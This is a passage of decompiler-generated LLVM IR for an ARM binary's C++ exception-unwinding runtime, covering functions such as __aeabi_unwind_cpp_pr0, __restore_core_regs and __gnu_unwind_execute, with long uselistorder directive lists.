  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_19abc, { 1, 0 }
  uselistorder i32 %v1_19ab8, { 1, 0 }
  uselistorder i32 %v0_19ab8, { 1, 0, 2 }
  uselistorder i32 %v4_19a90, { 0, 2, 1, 3 }
  uselistorder i32 %v0_19c34, { 1, 2, 0 }
  uselistorder i32 %v0_19a68, { 1, 0 }
  uselistorder i32 %v3_19a64, { 1, 0, 2 }
  uselistorder i32 %v1_19a38, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_19c70, { 1, 0 }
  uselistorder i1 %v2_19aa4, { 1, 0, 2 }
  uselistorder i32 %v1_199a8, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 80, 0, 15, 16, 79, 4, 34, 35, 17, 30, 18, 31, 19, 32, 20, 33, 2, 28, 36, 29, 37, 21, 38, 1, 5, 39, 40, 22, 41, 6, 42, 43, 44, 23, 45, 7, 46, 47, 48, 24, 49, 50, 51, 25, 52, 53, 54, 55, 8, 56, 57, 58, 59, 9, 60, 61, 62, 63, 64, 26, 65, 10, 66, 67, 68, 69, 70, 71, 27, 72, 11, 73, 74, 75, 76, 12, 77, 13, 14, 3, 78 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 25, 1, 2, 5, 12, 13, 9, 10, 11, 14, 18, 15, 6, 20, 21, 3, 22, 0, 23, 24, 7, 8, 16, 17, 19, 4 }
  uselistorder i32 48, { 18, 2, 0, 7, 5, 6, 10, 11, 8, 9, 15, 16, 17, 12, 13, 3, 4, 14, 1 }
  uselistorder i32 44, { 42, 2, 43, 44, 0, 14, 3, 16, 4, 5, 6, 26, 27, 28, 29, 30, 31, 23, 24, 25, 7, 21, 22, 8, 1, 9, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 10, 11, 12, 13, 15, 17, 18, 19, 20 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 144, 149, 143, 148, 28, 29, 30, 31, 32, 33, 34, 141, 35, 37, 36, 38, 2, 39, 0, 3, 40, 41, 43, 42, 1, 46, 44, 45, 47, 145, 49, 48, 52, 53, 54, 50, 51, 55, 56, 58, 59, 60, 57, 61, 146, 62, 64, 63, 66, 65, 67, 147, 68, 70, 69, 72, 71, 77, 73, 78, 74, 79, 75, 76, 80, 81, 82, 83, 85, 86, 84, 142, 88, 87, 91, 92, 93, 89, 90, 94, 101, 95, 102, 96, 103, 97, 104, 98, 105, 99, 100, 107, 106, 108, 109, 110, 111, 116, 112, 117, 113, 118, 114, 115, 120, 119, 121, 122, 123, 126, 124, 127, 125, 128, 129, 130, 131, 132, 134, 135, 133, 136, 138, 139, 137, 140 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 7, 8, 5, 0, 6, 2, 3, 1, 4 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_23010.366 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 14, 15, 16, 0, 2, 1, 3, 4, 5, 12, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19df8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19d14, { 1, 0 }
  uselistorder label %dec_label_pc_19cdc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19ca0, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_19c1c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_19b5c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_19b58, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_19ab8, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_19a14, { 1, 0 }
  uselistorder label %dec_label_pc_19a14.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19a14.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_19eb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_19eb4:
  %v0_19eb4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19eb4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19eb4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19eb4, %bb
  %v10_19ebc = phi i32 [ %arg1, %dec_label_pc_19eb4 ], [ 0, %bb ]
  ret i32 %v10_19ebc

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 96, 97, 98, 113, 91, 95, 114, 115, 116, 117, 118, 5, 4, 119, 110, 111, 99, 100, 92, 103, 102, 101, 104, 6, 10, 9, 88, 71, 107, 112, 93, 94, 87, 89, 90, 72, 73, 74, 75, 76, 70, 69, 68, 67, 7, 8, 77, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 21, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 78, 79, 80, 81, 82, 83, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 105, 84, 85, 86, 109, 106, 108, 120, 121 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 39, 14, 15, 16, 35, 36, 37, 38, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 34, 31, 32 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19ec4 = load i32, i32* @r1, align 4
  %v2_19ec4 = load i32, i32* @r2, align 4
  %v4_19ec4 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_19ec4, i32 %v2_19ec4, i32 2)
  ret i32 %v4_19ec4
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19ecc = load i32, i32* @r1, align 4
  %v2_19ecc = load i32, i32* @r2, align 4
  %v4_19ecc = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_19ecc, i32 %v2_19ecc, i32 1)
  ret i32 %v4_19ecc
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19ed4 = load i32, i32* @r1, align 4
  %v2_19ed4 = load i32, i32* @r2, align 4
  %v4_19ed4 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_19ed4, i32 %v2_19ed4, i32 0)
  ret i32 %v4_19ed4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 12, 11, 10, 57, 13, 0, 22, 14, 23, 58, 59, 60, 18, 19, 20, 21, 39, 40, 41, 42, 61, 62, 63, 77, 78, 79, 80, 1, 66, 67, 2, 68, 69, 3, 70, 64, 65, 33, 34, 4, 5, 6, 55, 56, 7, 8, 43, 44, 45, 71, 72, 73, 74, 75, 76, 35, 36, 37, 46, 47, 48, 54, 24, 15, 16, 17, 27, 28, 25, 26, 29, 30, 31, 32, 38, 9, 49, 50, 51, 52, 53 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_19edc = add i32 %tmp, 56
  %v4_19edc = inttoptr i32 %v3_19edc to i32*
  %v5_19edc = load i32, i32* %v4_19edc, align 4
  %v6_19edc = add i32 %tmp, 60
  %v7_19edc = inttoptr i32 %v6_19edc to i32*
  %v8_19edc = load i32, i32* %v7_19edc, align 4
  %v2_19ee8 = load i32, i32* %arg1, align 4
  %v3_19ee8 = add i32 %tmp, 4
  %v4_19ee8 = inttoptr i32 %v3_19ee8 to i32*
  %v5_19ee8 = load i32, i32* %v4_19ee8, align 4
  store i32 %v5_19ee8, i32* @r1, align 4
  %v12_19ee8 = add i32 %tmp, 16
  %v13_19ee8 = inttoptr i32 %v12_19ee8 to i32*
  %v14_19ee8 = load i32, i32* %v13_19ee8, align 4
  store i32 %v14_19ee8, i32* @r4, align 4
  %v15_19ee8 = add i32 %tmp, 20
  %v16_19ee8 = inttoptr i32 %v15_19ee8 to i32*
  %v17_19ee8 = load i32, i32* %v16_19ee8, align 4
  store i32 %v17_19ee8, i32* @r5, align 4
  %v18_19ee8 = add i32 %tmp, 24
  %v19_19ee8 = inttoptr i32 %v18_19ee8 to i32*
  %v20_19ee8 = load i32, i32* %v19_19ee8, align 4
  store i32 %v20_19ee8, i32* @r6, align 4
  %v21_19ee8 = add i32 %tmp, 28
  %v22_19ee8 = inttoptr i32 %v21_19ee8 to i32*
  %v23_19ee8 = load i32, i32* %v22_19ee8, align 4
  store i32 %v23_19ee8, i32* @r7, align 4
  %v24_19ee8 = add i32 %tmp, 32
  %v25_19ee8 = inttoptr i32 %v24_19ee8 to i32*
  %v26_19ee8 = load i32, i32* %v25_19ee8, align 4
  store i32 %v26_19ee8, i32* @r8, align 4
  %v27_19ee8 = add i32 %tmp, 36
  %v28_19ee8 = inttoptr i32 %v27_19ee8 to i32*
  %v29_19ee8 = load i32, i32* %v28_19ee8, align 4
  store i32 %v29_19ee8, i32* @sb, align 4
  %v30_19ee8 = add i32 %tmp, 40
  %v31_19ee8 = inttoptr i32 %v30_19ee8 to i32*
  %v32_19ee8 = load i32, i32* %v31_19ee8, align 4
  store i32 %v32_19ee8, i32* @sl, align 4
  store i32 %v8_19edc, i32* @ip, align 4
  store i32 %v5_19edc, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_19edc)
  ret i32 %v2_19ee8

; uselistorder directives
  uselistorder i32 %v8_19edc, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 54, 55, 56, 57, 13, 14, 5, 0, 60, 6, 58, 59, 11, 12, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 1, 94, 95, 96, 97, 98, 99, 100, 101, 102, 7, 8, 103, 104, 105, 33, 34, 49, 50, 41, 42, 43, 2, 44, 45, 46, 37, 38, 39, 40, 47, 48, 35, 17, 9, 36, 10, 20, 15, 16, 27, 28, 29, 30, 31, 32, 21, 22, 23, 24, 25, 26, 3, 18, 19, 51, 4, 52, 53 }
  uselistorder i32 40, { 33, 29, 30, 31, 32, 11, 34, 3, 12, 7, 8, 4, 15, 2, 9, 6, 13, 14, 10, 16, 17, 18, 5, 19, 20, 0, 21, 23, 22, 24, 1, 25, 27, 26, 28 }
  uselistorder i32* @sb, { 116, 117, 118, 2, 3, 4, 5, 98, 99, 100, 101, 102, 103, 104, 105, 106, 109, 107, 108, 110, 82, 83, 56, 57, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 17, 18, 0, 23, 24, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 111, 112, 113, 114, 115 }
  uselistorder i32 36, { 17, 16, 4, 18, 6, 7, 5, 12, 15, 8, 13, 9, 0, 1, 2, 3, 10, 14, 11 }
  uselistorder i32* @r8, { 265, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 2, 264, 0, 38, 266, 11, 267, 12, 39, 40, 41, 42, 25, 26, 27, 28, 29, 30, 31, 32, 33, 4, 34, 35, 36, 37, 43, 44, 45, 46, 13, 268, 14, 15, 22, 23, 5, 24, 200, 201, 6, 202, 203, 204, 228, 229, 230, 231, 232, 10, 233, 234, 235, 236, 237, 238, 239, 240, 16, 176, 177, 178, 179, 190, 191, 192, 193, 194, 133, 134, 135, 136, 47, 48, 49, 50, 88, 89, 90, 91, 92, 51, 52, 53, 54, 93, 94, 95, 96, 55, 56, 57, 58, 59, 60, 61, 17, 18, 19, 20, 21, 1, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 7, 81, 82, 83, 84, 85, 86, 87, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 8, 155, 156, 157, 158, 159, 160, 161, 162, 9, 163, 164, 165, 166, 167, 168, 3, 169, 170, 171, 172, 173, 174, 175, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 195, 196, 197, 198, 199, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 241, 242, 243, 244, 245, 246 }
  uselistorder i32 32, { 88, 85, 86, 87, 47, 89, 90, 43, 53, 91, 42, 82, 48, 44, 66, 64, 65, 61, 62, 63, 74, 75, 67, 68, 56, 57, 72, 73, 49, 80, 81, 83, 2, 3, 5, 4, 84, 7, 6, 9, 8, 11, 10, 58, 59, 60, 45, 50, 46, 76, 13, 12, 15, 14, 17, 16, 19, 18, 54, 69, 55, 21, 20, 22, 24, 23, 25, 26, 28, 27, 70, 71, 77, 29, 30, 51, 31, 32, 33, 52, 34, 0, 35, 1, 36, 78, 37, 79, 38, 39, 40, 41 }
  uselistorder i32 28, { 45, 10, 28, 46, 25, 47, 48, 49, 50, 7, 29, 30, 26, 27, 34, 11, 31, 12, 42, 43, 44, 8, 13, 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 9, 33, 17, 32, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 24, { 96, 95, 97, 8, 9, 98, 0, 58, 59, 60, 61, 62, 63, 56, 57, 10, 64, 65, 75, 76, 66, 67, 7, 11, 94, 89, 90, 91, 1, 77, 78, 79, 37, 38, 12, 68, 53, 69, 70, 46, 40, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 54, 55, 71, 72, 73, 39, 74, 13, 14, 15, 16, 17, 2, 18, 19, 20, 3, 21, 22, 4, 23, 24, 25, 26, 27, 28, 5, 80, 29, 81, 82, 83, 84, 30, 31, 6, 85, 32, 86, 33, 34, 35, 87, 88, 92, 36, 93 }
  uselistorder i32 20, { 129, 127, 128, 130, 1, 4, 9, 34, 131, 30, 132, 133, 134, 135, 5, 136, 137, 2, 138, 35, 10, 31, 32, 33, 36, 37, 38, 51, 52, 39, 40, 139, 120, 121, 122, 123, 124, 125, 126, 11, 116, 117, 118, 3, 53, 12, 54, 55, 0, 29, 42, 13, 44, 6, 45, 46, 47, 48, 27, 28, 43, 41, 49, 50, 56, 57, 14, 58, 59, 60, 61, 62, 63, 64, 65, 15, 66, 67, 68, 69, 70, 71, 16, 72, 73, 17, 74, 75, 76, 77, 18, 78, 79, 19, 80, 81, 82, 83, 84, 20, 85, 86, 87, 88, 89, 90, 21, 91, 92, 93, 94, 22, 23, 95, 7, 96, 24, 97, 98, 99, 100, 8, 101, 25, 102, 103, 104, 105, 106, 26, 107, 108, 109, 110, 111, 112, 113, 114, 115, 119 }
  uselistorder i32* @r1, { 170, 18, 17, 16, 4, 171, 172, 65, 66, 82, 45, 2, 174, 46, 173, 156, 47, 48, 49, 19, 67, 1, 68, 69, 20, 177, 21, 5, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 6, 195, 196, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 71, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 3, 81, 22, 109, 110, 197, 23, 199, 200, 201, 202, 132, 133, 29, 84, 30, 198, 24, 31, 32, 33, 163, 164, 165, 166, 167, 168, 169, 44, 101, 102, 158, 7, 154, 155, 8, 159, 162, 160, 9, 161, 85, 86, 25, 153, 87, 157, 134, 135, 12, 34, 35, 36, 37, 38, 39, 40, 10, 205, 206, 207, 208, 0, 209, 26, 83, 111, 128, 203, 204, 175, 176, 27, 13, 88, 112, 113, 114, 115, 116, 28, 136, 137, 89, 90, 41, 42, 43, 91, 92, 93, 95, 96, 94, 138, 97, 98, 99, 100, 103, 104, 105, 14, 106, 107, 108, 117, 118, 119, 15, 120, 149, 150, 11, 121, 122, 123, 124, 125, 126, 127, 129, 130, 131, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 151, 152 }
  uselistorder i32 60, { 3, 24, 25, 26, 4, 5, 1, 6, 17, 18, 19, 20, 21, 22, 7, 13, 14, 8, 15, 16, 9, 10, 0, 11, 12, 2, 23 }
  uselistorder i32 56, { 4, 34, 35, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 11, 10, 3, 12, 13, 14, 15, 16, 31, 32, 27, 28, 5, 6, 2, 7, 1, 8, 9, 29, 30, 0, 33 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19ef8 = load i32, i32* @r0, align 4
  ret i32 %v1_19ef8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19f00 = load i32, i32* @r0, align 4
  ret i32 %v1_19f00
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19f14 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19f18 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_19f14, i32 0)
  ret i32 %v2_19f18

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19f38 = ptrtoint i32* %stack_var_-68 to i32
  %v2_19f3c = call i32 @__gnu_Unwind_Resume(i32 %v2_19f38, i32 0)
  ret i32 %v2_19f3c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19f5c = ptrtoint i32* %stack_var_-68 to i32
  %v2_19f60 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_19f5c, i32 0)
  ret i32 %v2_19f60

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_19f80 = ptrtoint i32* %stack_var_-68 to i32
  %v6_19f84 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_19f80, i32 %arg2, i8* %arg3, i32 %v2_19f80)
  ret i32 %v6_19f84

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_19fb0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19fb8 = add i32 %tmp1, 76
  %v2_19fb8 = inttoptr i32 %v1_19fb8 to i32*
  %v3_19fb8 = load i32, i32* %v2_19fb8, align 4
  %v1_19fbc = add i32 %v3_19fb8, 7
  %v2_19fbc = inttoptr i32 %v1_19fbc to i8*
  %v3_19fbc = load i8, i8* %v2_19fbc, align 1
  %v4_19fbc = zext i8 %v3_19fbc to i32
  %v1_19fc0 = add i32 %v3_19fb8, 8
  %v3_19fc4 = mul nuw nsw i32 %v4_19fbc, 4
  %v2_19fc8 = add i32 %v3_19fc4, %v1_19fc0
  %v3_19fc8 = inttoptr i32 %v2_19fc8 to i8*
  ret i8* %v3_19fc8
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_19fd8 = load i32, i32* @r6, align 4
  %v21_19fd8 = load i32, i32* @lr, align 4
  %v0_19fdc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19fdc, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_19fec

dec_label_pc_19fec:                               ; preds = %dec_label_pc_19fec.backedge, %entry
  %v3_19ff8 = phi i32 [ %v0_19fec.pre, %dec_label_pc_19fec.backedge ], [ %tmp, %entry ]
  %v1_19fec = add i32 %v3_19ff8, 8
  %v2_19fec = inttoptr i32 %v1_19fec to i8*
  %v3_19fec = load i8, i8* %v2_19fec, align 1
  %v4_19fec = zext i8 %v3_19fec to i32
  store i32 %v4_19fec, i32* %r3.global-to-local, align 4
  %v2_19ff0 = icmp eq i8 %v3_19fec, 0
  store i1 %v2_19ff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19ff0, label %dec_label_pc_1a000, label %.thread

.thread:                                          ; preds = %dec_label_pc_19fec
  %v2_19ff4 = add nsw i32 %v4_19fec, -1
  store i32 %v2_19ff4, i32* %r3.global-to-local, align 4
  %v2_19ff8 = trunc i32 %v2_19ff4 to i8
  store i8 %v2_19ff8, i8* %v2_19fec, align 1
  %v0_19ffc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19ffc.pr.pr, label %.thread.dec_label_pc_1a000_crit_edge, label %dec_label_pc_1a028

.thread.dec_label_pc_1a000_crit_edge:             ; preds = %.thread
  %v0_1a000.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a000

dec_label_pc_1a000:                               ; preds = %.thread.dec_label_pc_1a000_crit_edge, %dec_label_pc_19fec
  %v0_1a000 = phi i32 [ %v0_1a000.pre, %.thread.dec_label_pc_1a000_crit_edge ], [ %v3_19ff8, %dec_label_pc_19fec ]
  %v1_1a000 = add i32 %v0_1a000, 9
  %v2_1a000 = inttoptr i32 %v1_1a000 to i8*
  %v3_1a000 = load i8, i8* %v2_1a000, align 1
  %v4_1a000 = zext i8 %v3_1a000 to i32
  store i32 %v4_1a000, i32* %r3.global-to-local, align 4
  %v2_1a004 = icmp eq i8 %v3_1a000, 0
  store i1 %v2_1a004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a004, label %dec_label_pc_1a108, label %dec_label_pc_1a00c

dec_label_pc_1a00c:                               ; preds = %dec_label_pc_1a0fc, %dec_label_pc_1a000
  %v2_1a010 = phi i32 [ %v0_1a0fc, %dec_label_pc_1a0fc ], [ %v0_1a000, %dec_label_pc_1a000 ]
  %v0_1a00c = phi i32 [ %v4_1a0fc, %dec_label_pc_1a0fc ], [ %v4_1a000, %dec_label_pc_1a000 ]
  %v1_1a00c = add nsw i32 %v0_1a00c, -1
  store i32 %v1_1a00c, i32* %r3.global-to-local, align 4
  %v1_1a010 = trunc i32 %v1_1a00c to i8
  %v3_1a010 = add i32 %v2_1a010, 9
  %v4_1a010 = inttoptr i32 %v3_1a010 to i8*
  store i8 %v1_1a010, i8* %v4_1a010, align 1
  %v0_1a014 = load i32, i32* @r5, align 4
  %v1_1a014 = add i32 %v0_1a014, 4
  %v2_1a014 = inttoptr i32 %v1_1a014 to i32*
  %v3_1a014 = load i32, i32* %v2_1a014, align 4
  store i32 %v3_1a014, i32* %r2.global-to-local, align 4
  %v1_1a018 = inttoptr i32 %v3_1a014 to i32*
  %v2_1a018 = load i32, i32* %v1_1a018, align 4
  store i32 %v2_1a018, i32* %r0.global-to-local, align 4
  %v4_1a018 = add i32 %v3_1a014, 4
  store i32 %v4_1a018, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1a020 = inttoptr i32 %v0_1a014 to i32*
  store i32 %v2_1a018, i32* %v1_1a020, align 4
  %v5_1a020 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1a020, i32* %v2_1a014, align 4
  %v0_1a024 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a024 = trunc i32 %v0_1a024 to i8
  %v2_1a024 = load i32, i32* @r5, align 4
  %v3_1a024 = add i32 %v2_1a024, 8
  %v4_1a024 = inttoptr i32 %v3_1a024 to i8*
  store i8 %v1_1a024, i8* %v4_1a024, align 1
  br label %dec_label_pc_1a028

dec_label_pc_1a028:                               ; preds = %.thread, %dec_label_pc_1a00c, %.thread6
  %v0_1a028 = load i32, i32* @r5, align 4
  %v1_1a028 = inttoptr i32 %v0_1a028 to i32*
  %v2_1a028 = load i32, i32* %v1_1a028, align 4
  %v3_1a02c = udiv i32 %v2_1a028, 16777216
  store i32 %v3_1a02c, i32* @r4, align 4
  store i32 %v3_1a02c, i32* %ip.global-to-local, align 4
  %v3_1a034 = mul i32 %v2_1a028, 256
  store i32 %v3_1a034, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_1a028, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_1a034, i32* %v1_1a028, align 4
  br i1 %tmp183, label %dec_label_pc_1a108, label %dec_label_pc_1a044

dec_label_pc_1a044:                               ; preds = %dec_label_pc_1a028
  %v0_1a044 = load i32, i32* @r4, align 4
  %v1_1a044 = and i32 %v0_1a044, 128
  store i32 %v1_1a044, i32* %r1.global-to-local, align 4
  %v2_1a044 = icmp eq i32 %v1_1a044, 0
  store i1 %v2_1a044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a044, label %dec_label_pc_1a120, label %dec_label_pc_1a04c

dec_label_pc_1a04c:                               ; preds = %dec_label_pc_1a044
  %v1_1a04c = and i32 %v0_1a044, 240
  store i32 %v1_1a04c, i32* @r6, align 4
  %v7_1a050 = icmp eq i32 %v1_1a04c, 128
